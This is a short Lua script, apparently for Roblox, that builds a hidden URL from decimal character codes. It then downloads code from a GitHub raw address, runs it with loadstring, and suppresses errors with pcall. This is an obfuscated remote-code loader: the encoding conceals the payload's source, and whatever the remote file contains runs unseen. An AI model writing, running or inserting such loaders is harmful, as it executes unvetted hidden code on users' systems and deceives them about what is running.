local urlBytes = {
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 
    103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 
    110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 83, 99, 
    114, 105, 112, 116, 101, 114, 98, 108, 97, 98, 108, 97, 
    47, 76, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 
    115, 47, 109, 97, 105, 110, 47, 84, 46, 82, 46, 67
}

local url = ""
for _, b in ipairs(urlBytes) do
    url = url .. string.char(b)
end

pcall(function()
    loadstring(game:HttpGet(url))()
end)

